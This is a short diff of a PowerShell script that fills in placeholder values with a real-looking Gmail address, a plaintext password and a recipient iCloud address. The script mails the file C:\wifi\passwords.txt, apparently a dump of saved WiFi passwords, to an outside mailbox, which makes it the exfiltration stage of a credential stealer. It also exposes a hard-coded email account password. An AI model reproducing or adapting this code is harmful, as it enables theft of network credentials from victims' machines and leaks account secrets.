@@ -1,5 +1,5 @@
-$Username = "YOUR GMAIL ADDRESS";
-$Password= "YOUR GMAIL PASSWORD";
+$Username = "marnina.rose@gmail.com";
+$Password= "Colorado123!";
 $path= "C:\wifi\passwords.txt"
 
 function Send-ToEmail([string]$email, [string]$attachmentpath){
@@ -19,4 +19,4 @@ function Send-ToEmail([string]$email, [string]$attachmentpath){
     write-host "Mail Sent" ; 
     $attachment.Dispose();
  }
-Send-ToEmail  -email "RECIPIENT" -attachmentpath $path;
+Send-ToEmail  -email "marnina.rose@icloud.com" -attachmentpath $path;
